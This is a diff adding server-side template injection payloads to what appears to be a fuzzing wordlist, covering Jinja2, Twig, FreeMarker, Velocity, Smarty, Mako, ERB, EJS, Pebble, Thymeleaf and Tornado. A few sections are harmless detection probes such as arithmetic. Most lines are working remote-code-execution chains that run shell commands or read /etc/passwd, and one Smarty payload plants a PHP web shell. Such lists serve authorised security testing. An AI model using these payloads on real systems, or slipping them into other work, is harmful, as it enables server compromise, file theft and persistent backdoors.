@@ -173,3 +173,132 @@ __${7*7}__::.x
 ${class.getName()}
 #set($a='')${a.class}
 <%= undefined %>
+
+# ── JINJA2: DETECTION MARKERS ──
+{{7*7}}
+{{7*'7'}}
+{{'abc'|upper}}
+{{'abc'|reverse}}
+{{range(3)|list}}
+{{dict(a=1)}}
+{{lipsum(1,1,1,1)}}
+{{namespace(x=1).x}}
+{{cycler('a','b').next()}}
+{{joiner('|')()}}
+{{[]|tojson}}
+
+# ── JINJA2: RCE CHAIN VARIANTS ──
+{{().__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}
+{{config.__class__.__init__.__globals__['__builtins__'].__import__('os').system('id')}}
+{{''.__class__.__mro__[1].__subclasses__()[396].__init__.__globals__['sys'].modules['subprocess'].check_output('id',shell=True)}}
+{%set x=config.__class__.__init__.__globals__['os'].popen('id').read()%}{{x}}
+{{ [].class.base.subclasses() | selectattr("__name__","eq","Popen") | list | first ("id",shell=true,stdout=-1) | attr("communicate") () }}
+
+# ── TWIG: RCE CHAIN VARIANTS ──
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("cat /etc/passwd")}}
+{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{_self.env.getFilter("id")}}
+{{['id']|map('shell_exec')|join}}
+{{['cat /etc/passwd']|map('shell_exec')|join}}
+{%set a='id'%}{{[a]|map('system')|join}}
+{{dump(_self)}}
+{{dump(app.request.server)}}
+
+# ── FREEMARKER: RCE EXTENDED ──
+<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
+<#assign x="freemarker.template.utility.Execute"?new()>${x("cat /etc/passwd")}
+<#assign x="freemarker.template.utility.Execute"?new()>${x("whoami")}
+${object.class.forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance([["id"]]).start().text}
+<#list 0..999 as i><#if i==100><#assign x="freemarker.template.utility.Execute"?new()>${x("id")}</#if></#list>
+
+# ── VELOCITY: RCE EXTENDED ──
+#set($cmd="id")
+#set($str=$class.inspect("java.lang.String").type)
+#set($runtime=$class.forName("java.lang.Runtime").getRuntime())
+#set($process=$runtime.exec($cmd))
+#set($inputStream=$process.getInputStream())
+#set($reader=$class.forName("java.io.InputStreamReader").getDeclaredConstructors()[0].newInstance([$inputStream]))
+#set($bufferedReader=$class.forName("java.io.BufferedReader").getDeclaredConstructors()[0].newInstance([$reader]))
+$bufferedReader.readLine()
+
+# ── SMARTY: RCE EXTENDED ──
+{php}system('id');{/php}
+{php}echo shell_exec('id');{/php}
+{php}echo passthru('id');{/php}
+{php}echo `id`;{/php}
+{php}file_put_contents('/var/www/html/ws.php','<?php system($_GET[c]);?>');{/php}
+{if system('id')}{/if}
+{if shell_exec('id')}{/if}
+
+# ── MAKO: RCE EXTENDED ──
+${__import__('os').system('id')}
+${__import__('subprocess').check_output('id',shell=True)}
+<%! import subprocess %>${subprocess.check_output('id',shell=True).decode()}
+<%! from subprocess import check_output %>${check_output('id',shell=True).decode()}
+${__import__('os').popen('cat /etc/passwd').read()}
+
+# ── RUBY ERB: RCE EXTENDED ──
+<%= `id` %>
+<%= `cat /etc/passwd` %>
+<%= `whoami` %>
+<%= system("id") %>
+<%= exec("id") %>
+<%= IO.read('/etc/passwd') %>
+<%= File.read('/etc/passwd') %>
+<% require 'open3' %><%= Open3.capture3("id")[0] %>
+<%= Kernel.system("id") %>
+
+# ── NODE.JS EJS/JADE: RCE ──
+<%= require('child_process').execSync('id').toString() %>
+<%= require('child_process').spawnSync('id').stdout.toString() %>
+#{require('child_process').execSync('id').toString()}
+- var x = require('child_process').execSync('id').toString()
+  = x
+<% global.process.mainModule.constructor._resolveFilename('child_process') %>
+
+# ── DETECTION: MATHEMATICAL OUTPUTS ──
+{{49}}
+{{7*7}}
+${7+7}
+#{6*6}
+<%= 5*5 %>
+#set($x=6*6)$x
+[[${3+4}]]
+{{2+2}}
+${"hello"+"world"}
+{{"hello"+"world"}}
+{{range(10)|list|count}}
+${7*7}==49
+
+# ── DETECTION: STRING MANIPULATION ──
+{{'hello'|upper}}
+{{'HELLO'|lower}}
+{{'hello world'|title}}
+{{'  hello  '|trim}}
+{{'hello'|reverse}}
+{{'abc'|length}}
+${str.toUpperCase()}
+#set($str='hello')${str.toUpperCase()}
+<%= 'hello'.upcase %>
+{{ "hello".toUpperCase() }}
+
+# ── PEBBLE: RCE EXTENDED ──
+{% set os = "".class.forName("java.lang.Runtime").getMethod("exec","".class) %}
+{% set runtime = "".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null) %}
+{% set process = os.invoke(runtime,"id") %}
+{{ process }}
+{% for i in "".class.forName("java.lang.Runtime").getDeclaredMethods() %}{{ i }}{% endfor %}
+
+# ── THYMELEAF: RCE EXTENDED ──
+[[${T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"})}]]
+[[${T(java.lang.ProcessBuilder).class.getDeclaredConstructors()[0].newInstance([["/bin/sh","-c","id"]]).start()}]]
+__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
+[(${T(java.lang.Runtime).getRuntime().exec("id")})]
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+
+# ── TORNADO: RCE EXTENDED ──
+{% import os %}{{os.system('id')}}
+{% import subprocess %}{{subprocess.check_output('id',shell=True).decode()}}
+{%from os import*%}{{popen('id').read()}}
+{%import subprocess as s%}{{s.check_output('id',shell=True)}}
